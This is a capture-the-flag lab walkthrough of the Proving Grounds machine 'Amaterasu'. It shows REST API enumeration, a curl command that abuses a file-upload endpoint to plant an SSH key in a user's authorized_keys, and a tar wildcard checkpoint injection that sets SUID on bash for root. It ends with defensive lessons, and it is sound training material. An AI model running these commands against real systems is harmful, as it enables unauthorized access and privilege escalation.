# Amaterasu: Walkthrough

## Overview
**Machine Name**: Amaterasu
**Platform**: Proving Grounds
**Difficulty**: Easy
**OS**: Linux (Fedora)
**Focus**: REST API Enumeration, File Upload Restriction Bypass, SUID/Cronjob Wildcard Privilege Escalation

## Enumeration
### Network Discovery
An Nmap ping sweep was performed to discover active hosts, locating the target machine at IP address `192.168.65.249`.
![](screenshots/Pasted%20image%2020260608170909.png)

### Port Scanning
A full TCP port scan was conducted to identify open services:
```bash
nmap -T4 -p- -A 192.168.65.249
```
The scan revealed the following ports:
| Port | Service | Version |
| --- | --- | --- |
| 21/tcp | ftp | vsftpd 3.0.3 |
| 22/tcp | ssh | OpenSSH 8.6 (Protocol 2.0; closed) |
| 111/tcp | rpcbind | closed |
| 139/tcp | netbios-ssn | closed |
| 443/tcp | https | closed |
| 445/tcp | microsoft-ds | closed |
| 2049/tcp | nfs | closed |
| 10000/tcp | snet-sensor-mgmt| closed |
| 25022/tcp | ssh | OpenSSH 8.6 (Protocol 2.0) |
| 33414/tcp | http | Werkzeug httpd 2.2.3 (Python 3.9.13) |
| 40080/tcp | http | Apache httpd 2.4.53 (Fedora) |

### Web & API Enumeration
Both HTTP web ports (`33414` and `40080`) were visited. 
![](screenshots/Pasted%20image%2020260608171334.png)
![](screenshots/Pasted%20image%2020260608171344.png)

Directory busting was executed on both ports using common wordlists:
![](screenshots/Pasted%20image%2020260608171932.png)
![](screenshots/Pasted%20image%2020260608171947.png)

On port `33414`, the directory `/help` was discovered. It listed several REST API endpoints, including file upload/download functionality:
![](screenshots/Pasted%20image%2020260608171842.png)

Attempts were made to inject system commands into `/file-list?dir=.` but were unsuccessful.

However, the file upload API `/file-upload` allowed uploading files. Initially, a PHP reverse shell upload failed because of file-type restrictions. Further enumeration of the file system through the API disclosed the home directory of the user `alfredo`, which contained a `.ssh` directory.
![](screenshots/Pasted%20image%2020260608184007.png)

Testing upload capabilities with a `.txt` extension demonstrated that text files were accepted.
![](screenshots/Pasted%20image%2020260608184133.png)
![](screenshots/Pasted%20image%2020260608184141.png)

## Exploitation
### SSH Key Injection via File Upload API
Since the `/file-upload` API accepted text files and allowed specifying a target path, it was used to upload an SSH public key directly into the `alfredo` user's home directory.

A new SSH key pair was generated on the attacker host, and the public key (`id_rsa.txt`) was uploaded and saved as `authorized_keys`:
```bash
curl -H 'Content-Type: multipart/form-data' POST http://192.168.61.249:33414/file-upload -F file="@/home/kali/.ssh/id_rsa.txt" -F filename='/home/alfredo/.ssh/authorized_keys'
```
![](screenshots/Pasted%20image%2020260609190712.png)
![](screenshots/Pasted%20image%2020260609190836.png)
![](screenshots/Pasted%20image%2020260608185311.png)

### Initial Access
A connection was established to the machine via SSH on port `25022` using the matching private key:
```bash
ssh alfredo@192.168.61.249 -p 25022 -i id_rsa
```
![](screenshots/Pasted%20image%2020260609190918.png)
```bash
[alfredo@fedora ~]$ whoami
alfredo
```

## Privilege Escalation
### Local Enumeration
Sudo commands were not available because the password for `alfredo` was unknown.
![](screenshots/Pasted%20image%2020260609191126.png)

Searching for SUID files yielded nothing of interest.
![](screenshots/Pasted%20image%2020260609192031.png)

A system cronjob was found running inside `/home/alfredo/restapi` that utilized `tar` with a wildcard (`*`) to package files.
![](screenshots/Pasted%20image%2020260609192122.png)

### Wildcard Tar Privilege Escalation
Since the cronjob runs as `root` and calls `tar` with a wildcard inside a directory writable by `alfredo`, this setup is vulnerable to wildcard command injection.

A shell payload was created:
```bash
echo "cp /bin/bash /tmp/bash; chmod +s /tmp/bash" > shell.sh
chmod +x shell.sh
```
![](screenshots/Pasted%20image%2020260609194437.png)
![](screenshots/Pasted%20image%2020260609194703.png)

Tar checkpoint files were created to execute the payload script when the cronjob ran:
```bash
touch -- "--checkpoint=1"
touch -- "--checkpoint-action=exec=sh shell.sh"
```

### Root Access
Once the cronjob triggered the backup, the wildcard expansion passed the checkpoint parameters as options to the `tar` command, executing `shell.sh` with root permissions. This set the SUID bit on the copied `/tmp/bash` binary:
```bash
[alfredo@fedora tmp]$ ls -la bash
-rwsr-sr-x 1 root root 1390080 Jun  9 10:08 bash
```
![](screenshots/Pasted%20image%2020260609194729.png)

A shell was spawned with root privileges using the SUID bash binary:
```bash
/tmp/bash -p
```
![](screenshots/Pasted%20image%2020260609194809.png)
```bash
whoami
root
```

## Post-Exploitation
### Flag Recovery
- User Flag (`/home/alfredo/local.txt`):
  ![](screenshots/Pasted%20image%2020260609191006.png)
- Root Flag (`/root/root.txt`):
  ![](screenshots/Pasted%20image%2020260609194904.png)

## Lessons Learned
1. Never run archiving or packaging cronjobs using wildcards (`*`) as they allow command injection via parameter hijacking.
2. File upload APIs must enforce strict validation on paths, extensions, and target directories, prohibiting writes to critical user system directories such as `.ssh`.
